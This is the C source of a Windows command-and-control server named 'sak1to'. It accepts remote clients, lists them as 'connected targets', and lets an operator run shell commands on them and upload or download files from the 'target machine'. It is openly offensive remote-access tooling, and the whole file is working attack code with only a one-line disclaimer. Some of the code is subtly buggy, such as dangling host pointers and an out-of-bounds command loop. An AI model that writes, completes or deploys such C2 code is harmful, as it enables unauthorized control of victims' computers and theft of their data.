/*
Coded by d4rkstat1c.
Use this code educationally/legally.
#GSH
*/
#include <WS2tcpip.h>
#include <stdio.h>

#pragma comment (lib, "ws2_32.lib")

#define BUFLEN 8192
// Default allocation for conns.clients.
#define MEM_CHUNK 5

typedef int (*func)(char*, size_t, SOCKET);


typedef struct {
	// Client hostname.
	char* host;
	// Client socket.
	SOCKET sock;
} Conn;

typedef struct {
	// Array of Conn objects/structures.
	Conn* clients;
	// Memory blocks allocated.
	size_t alloc;
	// Amount of memory used.
	size_t size;
} Conn_array;



// Function to close specified socket.
void close_socket(SOCKET socket) {
	closesocket(socket);
	WSACleanup();
}


// Function to create socket.
SOCKET create_socket() {
	// Initialize winsock.
	WSADATA wsData;
	WORD ver = MAKEWORD(2, 2);

	int wsResult = WSAStartup(ver, &wsData);

	// Create the server socket object.
	SOCKET listen_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (listen_socket == INVALID_SOCKET) {
		printf("Socket creation failed with error: %ld\n", WSAGetLastError());
		WSACleanup();
		exit(1);
	}

	return listen_socket;
}



// Function to bind socket to specified port.
void bind_socket(SOCKET listen_socket, int port) {
	// Create hint structure.
	struct sockaddr_in hint;
	hint.sin_family = AF_INET;
	hint.sin_port = htons(port);
	hint.sin_addr.S_un.S_addr = INADDR_ANY;

	// Bind ip address and port to listen_socket.
	if (bind(listen_socket, (struct sockaddr*)&hint, sizeof(hint)) == SOCKET_ERROR) {
		printf("Socket bind failed with error: %d\n", WSAGetLastError());
		close_socket(listen_socket);
		exit(1);
	}

	// Tell winsock the socket is for listen_socket.
	listen(listen_socket, SOMAXCONN);
}


// Thread to recursively accept connections.
DWORD WINAPI accept_conns(LPVOID* lp_param) {
	Conn_array* conns = (Conn_array*)lp_param;
	conns->alloc = MEM_CHUNK;

	conns->size = 0;
	conns->clients = malloc(conns->alloc * sizeof(Conn));

	while (1) {
		SOCKET listen_socket = create_socket();
		bind_socket(listen_socket, 5400);

		// Wait for a connection.
		struct sockaddr_in client;
		int clientSize = sizeof(client);

		// Client socket object.
		SOCKET client_socket = accept(listen_socket, (struct sockaddr*)&client, &clientSize);

		// Client's remote name and port the client is connected on.
		char host[NI_MAXHOST] = { 0 };
		char service[NI_MAXHOST] = { 0 };

		if (conns->size == conns->alloc)
			conns->clients = realloc(conns->clients, (conns->alloc += MEM_CHUNK) * sizeof(Conn));

		// Add hostname string and client_socket object to Conn structure.
		conns->clients[conns->size].host = host;
		conns->clients[conns->size].sock = client_socket;
		conns->size++;

		if (getnameinfo((struct sockaddr*)&client, sizeof(client), host, NI_MAXHOST, service, NI_MAXSERV, 0) == 0) {
			printf("%s connected on port %s\n", host, service);
		}
		else {
			inet_ntop(AF_INET, &client.sin_addr, host, NI_MAXHOST);
			printf("%s connected on port %hu\n", host, ntohs(client.sin_port));
		}
		closesocket(listen_socket);
	}
	free(conns->clients);
}


// Function to receive file from target machine (TCP file transfer).
int send_file(char* buf, size_t cmd_len, SOCKET client_socket) {
	// Send command to the client to be parsed.
	buf[6] = '2';
	if (!send(client_socket, &buf[6], cmd_len, 0))
		return SOCKET_ERROR;

	// Open file.
	FILE* fd = fopen(&buf[7], "rb");

	// Recursively read file until EOF is detected and send file bytes to client in BUFLEN chunks.
	int bytes_read, iResult = 1;
	while (!feof(fd) && iResult > 0) {
		if (bytes_read = fread(buf, 1, BUFLEN, fd)) {
			// Send file's bytes chunk to remote server.
			iResult = send(client_socket, buf, bytes_read, 0);
		}
		else {
			break;
		}
	}
	fclose(fd);

	return iResult;
}



// Function to receive file from target machine (TCP file transfer).
int recv_file(char* buf, size_t cmd_len, SOCKET client_socket) {
	// Send command to the client to be parsed.
	buf[8] = '3';
	if (!send(client_socket, &buf[8], cmd_len, 0))
		return SOCKET_ERROR;

	if (!recv(client_socket, buf, 1, 0))
		return SOCKET_ERROR;

	int iResult = 1;
	if (buf[0] == '1') {
		printf("File not found\n");
	}
	else {
		FILE* fd = fopen(&buf[9], "wb");

		// Receive all file bytes/chunks and write to parsed filename.
		do {
			iResult = recv(client_socket, buf, BUFLEN, 0);
			fwrite(buf, 1, iResult, fd);
		} while (iResult == BUFLEN);

		fclose(fd);
	}

	return iResult;
}


// Function to list all available connections.
void list_connections(Conn_array* conns) {
	printf("\n\n---------------------------\n");
	printf("---  C0NNECTED TARGETS  ---\n");
	printf("--     Hostname: ID      --\n");
	printf("---------------------------\n\n");
	if (conns->size) {
		for (size_t i = 0; i < conns->size; i++) {
			printf("%s: %lu\n", conns->clients[i].host, i);
		}
		printf("\n\n");
	}
	else {
		printf("No connected targets available.\n\n\n");
	}
}


// Function to resize conns array/remove connection.
void resize_conns(Conn_array* conns, int client_id) {
	for (size_t i = client_id; i < conns->size; i++) {
		conns->clients[i].sock = conns->clients[i + 1].sock;
		conns->clients[i].host = conns->clients[i + 1].host;
	}
	conns->clients[conns->size].sock = (SOCKET)NULL;
	conns->clients[conns->size].host = NULL;
	conns->size--;
}

// Function to read/store stdin until \n is detected.
size_t get_line(char* buf) {
	char c;
	size_t cmd_len = 0;

	c = getchar();
	while (c != '\n' && cmd_len < BUFLEN) {
		buf[cmd_len++] = c;
		c = getchar();
	}

	return cmd_len;
}

// Function send change directory command to client.
int client_cd(char* buf, size_t cmd_len, SOCKET client_socket) {
	buf[2] = '0';
	if (!send(client_socket, &buf[2], cmd_len, 0))
		return SOCKET_ERROR;

	return 1;
}

// Function to terminate client.
int terminate_client(char* buf, size_t cmd_len, SOCKET client_socket) {
	send(client_socket, "1", cmd_len, 0);

	return 0;
}

// Function to send command to client.
int send_cmd(char* buf, size_t cmd_len, SOCKET client_socket) {
	// Send command to server.
	if (!send(client_socket, buf, cmd_len, 0))
		return SOCKET_ERROR;

	// Receive command output stream and write output chunks to stdout.
	int iResult = 1;

	do {
		iResult = recv(client_socket, buf, BUFLEN, 0);
		fwrite(buf, 1, iResult, stdout);
	} while (iResult == BUFLEN);

	fputc('\n', stdout);

	return iResult;
}

// Function compare two strings (combined logic of strcmp and strncmp).
int compare(char* buf, char* str) {
	for (int j = 0; str[j] != '\0'; j++) {
		if (str[j] != buf[j]) {
			return 0;
		}
	}

	return 1;
}

// Function to return function pointer based on parsed command.
func parse_cmd(char* buf) {
	// Function pointer array of each c2 command.
	func func_array[4] = { &client_cd, &terminate_client, &send_file, &recv_file };
	// Array of strings to be parsed.
	char commands[4][10] = { "cd ", "exit", "upload ", "download " };

	for (int i = 0; i < 5; i++) {
		if (compare(buf, commands[i])) {
			return func_array[i];
		}
	}

	return NULL;
}

// Function to parse interactive input and send to specified client.
void interact(Conn_array* conns, char* buf, int client_id) {
	SOCKET client_socket = conns->clients[client_id].sock;
	char* client_host = conns->clients[client_id].host;

	int iResult = 1;
	// Receive and parse input/send commands to client.
	while (iResult > 0) {
		printf("%s // ", client_host);

		// Set all bytes in buffer to zero.
		memset(buf, '\0', BUFLEN);
		size_t cmd_len = get_line(buf);

		if (cmd_len) {
			if (compare(buf, "background")) {
				return;
			}
			else {
				// If a command is parsed call it's corresponding function else execute-
				// the command on the client.
				func target_func = parse_cmd(buf);
				if (target_func) {
					iResult = target_func(buf, cmd_len, client_socket);
				}
				else {
					iResult = send_cmd(buf, cmd_len, client_socket);
				}
			}
		}
	}

	close_socket(client_socket);
	resize_conns(conns, client_id);
	printf("Client: \"%s\" is no longer connected.\n\n", client_host);
}

// Function to execute command.
void exec_cmd(char* buf) {
	// Call Popen to execute command(s) and read the process' output.
	FILE* fpipe = _popen(buf, "r");

	fseek(fpipe, 0, SEEK_END);
	size_t cmd_len = ftell(fpipe);
	fseek(fpipe, 0, SEEK_SET);

	// Store command output.
	int rb = 0;
	do {
		rb = fread(buf, 1, BUFLEN, fpipe);
		fwrite(buf, 1, rb, stdout);
	} while (rb == BUFLEN);

	fputc('\n', stdout);


	// Close the pipe.
	_pclose(fpipe);
}

// Function for parsing console input.
void sakito_console(Conn_array* conns) {
	HANDLE  hColor;
	hColor = GetStdHandle(STD_OUTPUT_HANDLE);

	SetConsoleTextAttribute(hColor, 9);

	// Parse/execute sakito-console input.
	while (1) {
		printf("sak1to-console // ");

		// BUFLEN + 1 to ensure the string is always truncated/null terminated.
		char buf[BUFLEN + 1] = { 0 };
		size_t cmd_len = get_line(buf);

		if (cmd_len) {
			if (compare(buf, "exit")) {
				// if there's any connections close them before exiting.
				if (conns->size) {
					for (size_t i = 0; i < conns->size; i++) {
						close_socket(conns->clients[i].sock);
					}
					// Free allocated memory.
					free(conns->clients);
				}
				return;
			}
			else if (compare(buf, "cd ")) {
				// List all connections.
				_chdir(&buf[3]);
			}
			else if (compare(buf, "list")) {
				// List all connections.
				list_connections(conns);
			}
			else if (compare(buf, "interact ")) {
				// Interact with client.
				int client_id;
				client_id = atoi(&buf[9]);
				if (!conns->size || client_id < 0 || client_id > conns->size - 1) {
					printf("Invalid client identifier.\n");
				}
				else {
					interact(conns, buf, client_id);
				}
			}
			else {
				// Execute command on host system.
				exec_cmd(buf);
			}
		}
	}
}

// Main function.
int main(void) {
	Conn_array conns;
	CreateThread(0, 0, accept_conns, &conns, 0, 0);

	sakito_console(&conns);

	return -1;
}
